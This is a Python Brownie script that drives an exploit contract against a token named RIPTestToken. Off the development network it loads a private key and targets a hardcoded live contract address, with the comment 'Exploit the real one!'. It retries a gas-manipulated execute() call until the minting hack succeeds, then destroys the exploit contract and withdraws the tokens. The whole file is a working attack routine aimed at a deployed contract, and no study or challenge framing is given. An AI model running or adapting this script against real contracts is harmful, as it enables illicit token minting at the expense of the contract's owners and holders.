from brownie import RIPTestToken, RIPTokenExploit, Contract, accounts, config, network
from brownie.exceptions import VirtualMachineError
from web3 import Web3

def main():
  # Set here the amount you want to deposit
  amount_to_deposit = Web3.toWei(0.1, 'ether')

  # Add the account to use
  if network.show_active() == 'development':
    account = accounts[0]
    # Deploy a new token for local testing...
    ripToken = RIPTestToken.deploy({'from': account})
  else:
    account = accounts.add(config['private_key'])
    # Exploit the real one!
    ripToken = Contract.from_abi(RIPTestToken._name, '0xa475CB9264a74C9e2307b8516dB1DdC1Bc1EA952', RIPTestToken.abi)

  # Deploy the exploit and transfer the amount to deposit
  exploit = RIPTokenExploit.deploy(ripToken.address, {'from': account, 'value': amount_to_deposit})

  # Continue to try if we are not minting enough token
  txCount = 0
  while True:
    txCount += 1
    try:
      # Manually set the gas and allow revert to try to hack the token minting
      tx = exploit.execute({'from': account, 'gas_limit': 1000000, 'allow_revert': True})
      tx.wait(1)
      break
    except (VirtualMachineError, ValueError):
      print('Not enough token would be minted, execution reverted. Retrying...')

  print(f'Minted {ripToken.balanceOf(exploit.address)} {ripToken._name} in {txCount} tentative/s')
  
  # Hack successful, destroy the exploit and withdraw the tokens
  tx = exploit.destroy({'from': account})
  tx.wait(1)

  print(f'Now you have {ripToken.balanceOf(account.address)} {ripToken._name}')
